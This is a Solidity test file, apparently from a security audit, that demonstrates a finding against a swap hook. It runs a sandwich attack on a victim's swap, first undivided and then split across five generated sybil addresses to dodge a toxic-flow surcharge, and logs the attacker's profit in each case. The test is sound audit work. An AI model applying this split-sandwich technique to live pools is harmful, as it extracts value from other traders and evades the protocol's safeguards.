// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {EssentialsHookTestBase} from "./utils/EssentialsHookTestBase.sol";

contract AuditFindings_ToxicSplitEvasionTest is EssentialsHookTestBase {
    function test_A1_SplitSandwichEvadesToxicSurcharge() public {
        uint256 victimIn = 5 ether;
        uint256 attackerIn = 20 ether;

        // undivided baseline
        _queueSwap(true, attackerIn, attacker);
        _queueSwap(true, victimIn, victim);
        _queueSwap(false, attackerIn, attacker);
        _rollPastWindow();
        hook.settleBatch(key);
        int256 undividedPnl = int256(currency0.balanceOf(attacker)) - int256(attackerIn)
            + int256(currency1.balanceOf(attacker)) - int256(attackerIn);
        emit log_named_int("undivided attacker P&L", undividedPnl);
    }

    function test_A1_SplitSandwichEvadesToxicSurcharge_Split() public {
        uint256 victimIn = 5 ether;
        uint256 attackerIn = 20 ether;
        uint256 piece = attackerIn / 5; // 5 sybil pieces this time (more aggressive split)

        address[5] memory s;
        for (uint256 i = 0; i < 5; i++) {
            s[i] = address(uint160(uint256(keccak256(abi.encode("sybil", i)))));
        }

        for (uint256 i = 0; i < 5; i++) {
            _queueSwap(true, piece, s[i]);
        }
        _queueSwap(true, victimIn, victim);
        for (uint256 i = 0; i < 5; i++) {
            _queueSwap(false, piece, s[i]);
        }

        _rollPastWindow();
        hook.settleBatch(key);

        int256 pnl = -int256(2 * attackerIn);
        for (uint256 i = 0; i < 5; i++) {
            pnl += int256(currency0.balanceOf(s[i])) + int256(currency1.balanceOf(s[i]));
        }
        emit log_named_int("5-way split attacker aggregate P&L", pnl);
        emit log_named_uint("victim received", currency1.balanceOf(victim));
    }
}
